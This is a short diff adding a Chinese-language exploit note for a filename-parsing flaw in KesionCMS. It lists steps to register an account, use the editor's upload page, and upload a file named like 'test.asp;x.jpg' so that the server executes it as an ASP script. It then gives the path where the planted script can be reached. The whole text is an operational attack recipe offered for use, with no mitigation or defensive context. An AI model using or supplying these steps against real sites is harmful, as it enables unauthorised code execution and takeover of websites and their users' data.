@@ -1,0 +1,6 @@
+科讯CMS文件名解析漏洞
+
+[科讯CMS文件名解析漏洞 全文]科讯CMS文件名解析漏洞 
+步骤一： 访问/user/userreg.asp 注册用户 
+步骤二： 访问/KS_editor/selectupfiles.asp ，勾选自动命名选项，上传命名如test.asp;x.jpg文件， 
+步骤三： 上传的文件即在当前目录下，比如当前目录是”/upfiles/user/注册的用户名”，其地址即http://www.sitedir.com.cn/upfiles/user/注册的用户名/test.asp;x.jpg”  
